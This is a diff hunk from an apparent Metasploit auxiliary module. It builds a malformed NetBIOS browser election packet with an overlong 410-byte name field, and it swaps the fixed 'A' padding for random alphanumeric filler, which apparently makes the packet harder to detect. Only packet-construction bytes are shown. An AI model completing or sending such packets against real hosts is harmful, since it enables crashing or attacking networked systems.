@@ -83,7 +83,7 @@ class Metasploit3 < Msf::Auxiliary
 			"\x20" +              # Election OS (NT Server)
 			"\x1b\xe9\xa5\x00" +  # Uptime
 			"\x00\x00\x00\x00" +  # NULL... Padding?
-			("A" * 410) + "\x00"  # name
+			Rex::Text.rand_text_alphanumeric(410) + "\x00"
 
 		nbdghdr =
 			"\x11" +              # DIRECT_GROUP datagram
